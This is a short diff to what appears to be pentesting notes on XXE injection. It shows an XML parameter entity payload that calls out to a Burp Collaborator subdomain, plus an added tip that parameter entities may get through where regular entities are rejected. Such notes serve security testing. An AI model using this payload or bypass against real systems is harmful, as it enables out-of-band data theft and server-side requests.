@@ -10,3 +10,7 @@ Below you can find XML Parameter Entity
  <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
  %xxe; ]>
 ```
+
+Message about entities which are not allowed: 
+![image](https://github.com/user-attachments/assets/881773c0-6903-4c60-b6a5-2fef15ece44e)
+It could say, that regular entities are not allowed, but maybe parameter entities are.
